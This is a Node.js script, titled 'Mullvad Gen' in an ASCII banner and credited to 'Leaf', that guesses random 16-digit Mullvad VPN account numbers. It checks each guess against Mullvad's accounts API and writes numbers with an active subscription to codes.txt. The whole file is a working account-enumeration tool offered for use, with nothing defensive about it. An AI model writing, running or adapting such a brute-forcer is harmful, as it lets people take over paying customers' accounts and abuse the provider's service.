const readline = require('readline');
const { clear } = require('console');
const axios = require("axios");
const fs = require("fs");

function generateCode() {
  const length = 16;
  const characters = '0123456789';
  let code = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    code += characters.charAt(randomIndex);
  }

  return code;
}

async function check(loginCode) {
  const url = `https://api.mullvad.net/www/accounts/${loginCode}`;

  try {
    const response = await axios.get(url);
    if (response.data.account.subscription) {
      console.log(`\x1b[32m\x1b[0m OK \x1b[37m\x1b[0m | ${loginCode}`);
      saveCode(loginCode);
    } else {
      console.log(`\x1b[31m\x1b[0m Inactive \x1b[37m\x1b[0m | ${loginCode}`);
    }
  } catch (error) {
    console.log(`\x1b[31m\x1b[0m Invalid \x1b[37m\x1b[0m | ${loginCode}`);
  }
}

function saveCode(code) {
  fs.appendFileSync('codes.txt', code + '\n');
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

clear();

console.log('\x1b[32m%s\x1b[0m', "███╗░░░███╗██╗░░░██╗██╗░░░░░██╗░░░░░██╗░░░██╗░█████╗░██████╗░░░░██████╗░███████╗███╗░░██╗\n████╗░████║██║░░░██║██║░░░░░██║░░░░░██║░░░██║██╔══██╗██╔══██╗░░██╔════╝░██╔════╝████╗░██║\n██╔████╔██║██║░░░██║██║░░░░░██║░░░░░╚██╗░██╔╝███████║██║░░██║░░██║░░██╗░█████╗░░██╔██╗██║\n██║╚██╔╝██║██║░░░██║██║░░░░░██║░░░░░░╚████╔╝░██╔══██║██║░░██║░░██║░░╚██╗██╔══╝░░██║╚████║\n██║░╚═╝░██║╚██████╔╝███████╗███████╗░░╚██╔╝░░██║░░██║██████╔╝░░╚██████╔╝███████╗██║░╚███║\n╚═╝░░░░░╚═╝░╚═════╝░╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝");

console.log('Credits: Leaf (._woman)');

rl.question('How many codes to generate? ', (numCodes) => {
  clear();

  const codesToGenerate = parseInt(numCodes, 10);

  console.log(`Generating ${codesToGenerate} codes...`);

  start(codesToGenerate);

  rl.close();
});

function start(num) {
  for (let i = 0; i < num; i++) {
    setTimeout(() => {
      check(generateCode());
    }, 500);
  }
}